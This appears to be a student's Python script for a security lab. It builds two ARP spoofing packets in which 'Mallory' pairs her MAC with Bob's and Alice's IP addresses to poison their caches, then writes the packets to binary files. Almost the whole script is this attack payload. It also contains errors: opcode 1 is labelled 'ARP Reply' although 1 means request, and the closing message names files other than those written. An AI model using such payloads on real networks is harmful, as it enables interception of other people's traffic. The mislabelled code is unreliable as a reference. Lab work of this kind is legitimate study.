import struct

# ARP payload details
hardware_type = 1               # Ethernet (16-bit)
protocol_type = 0x0800          # IPv4 (16-bit)
hardware_len = 6                # MAC Address length (8-bit)
protocol_len = 4                # IPv4 Address length (8-bit)
operation = 1                   # ARP Reply (16-bit)

# Mallory's MAC
mallory_mac = b'\x02\x42\x0a\x0a\x1b\x04'  # Mallory's MAC

# Alice's MAC and IP
alice_mac = b'\x00\x00\x00\x00\x00\x00'    # Alice's MAC
alice_ip = b'\x0a\x0a\x1b\x02'             # Alice's IP

# Bob's MAC and IP
bob_mac = b'\x02\x42\x0a\x0a\x1b\x03'      # Bob's MAC
bob_ip = b'\x0a\x0a\x1b\x03'               # Bob's IP

# ARP payload for Alice (pretending to be Bob)
arp_payload_alice = struct.pack(
    '!HHBBH6s4s6s4s',
    hardware_type,
    protocol_type,
    hardware_len,
    protocol_len,
    operation,
    mallory_mac,   # Sender MAC (Mallory's MAC)
    bob_ip,        # Sender IP (Bob's IP)
    alice_mac,     # Target MAC (Alice's MAC)
    alice_ip       # Target IP (Alice's IP)
)

# ARP payload for Bob (pretending to be Alice)
arp_payload_bob = struct.pack(
    '!HHBBH6s4s6s4s',
    hardware_type,
    protocol_type,
    hardware_len,
    protocol_len,
    operation,
    mallory_mac,   # Sender MAC (Mallory's MAC)
    alice_ip,      # Sender IP (Alice's IP)
    bob_mac,       # Target MAC (Bob's MAC)
    bob_ip         # Target IP (Bob's IP)
)

# Write both payloads to separate binary files
with open(r'C:\Users\harih\OneDrive\Documents\1st Semester\ICS-Lab Tasks\Lab-Exercise 2\payload_alice_new.bin', 'wb') as f_alice:
    
    f_alice.write(arp_payload_alice)

with open(r'C:\Users\harih\OneDrive\Documents\1st Semester\ICS-Lab Tasks\Lab-Exercise 2\payload_bob.bin', 'wb') as f_bob:
    
    f_bob.write(arp_payload_bob)

print("ARP payloads written to arp_payload_alice.bin and arp_payload_bob.bin")
